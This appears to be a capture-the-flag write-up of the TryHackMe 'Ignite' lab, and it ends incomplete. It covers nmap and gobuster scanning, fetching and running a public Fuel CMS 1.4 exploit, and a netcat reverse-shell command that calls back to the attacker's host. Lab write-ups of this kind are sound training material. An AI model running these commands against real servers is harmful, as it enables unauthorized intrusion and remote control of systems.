# [Ignite](https://tryhackme.com/room/ignite)

> A new start-up has a few issues with their web server

## Scanning

Scan the target with nmap

```
nmap -A -T4 10.10.138.185
```

![image](https://user-images.githubusercontent.com/90561566/188138041-0e800d6a-7fc8-41a8-8bb4-e9535589f31d.png)

Hmm, found only 1 open port 80 (http)

## HTTP

Go to the web page

![image](https://user-images.githubusercontent.com/90561566/188138642-85ed4d57-3ec3-4467-bed3-dde8f7355691.png)

It's default page of fuel cms 1.4

## Enumeration

Gobuster to discover hidden directory

```
gobuster dir -u http://10.10.138.185 -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/188139192-d3977108-ff1f-43e1-b05b-5f6b4d0a6b41.png)

I connected to /0/ and /home/ directory and maybe in vain

![image](https://user-images.githubusercontent.com/90561566/188139966-5029d435-ba8f-4ceb-ba6d-a7a5f464cdbb.png)

I had logggd in and see nothing too

## Exploitation

I search exploit for fuelcms

```
searchsploit fuelcms 1.4
```

![image](https://user-images.githubusercontent.com/90561566/188140509-e7f1d285-a42e-4e56-bb53-75ce63f1e2af.png)

copy exploit

```
searchsploit -m 47138.py
vi 47138.py
```

change line 14 to target ip

![image](https://user-images.githubusercontent.com/90561566/188140922-cc1950b3-b5cc-46e5-a836-27ab5cd654f4.png)

```
chmod +x 47138.py
python 47138.py
```

![image](https://user-images.githubusercontent.com/90561566/188256466-ef67f34d-b02c-421e-b8f1-f15a6393e4a9.png)

now we open a reverse shell to control easily

```
nc -vlnp 1234
```

```
cmd: nc 192.168.211.137 1234
```



.

| Flag | User flag |
| --- | --- |
| Answer | <flag> |

## Privilege Escalation

.

| Flag | User flag |
| --- | --- |
| Answer | <flag> |
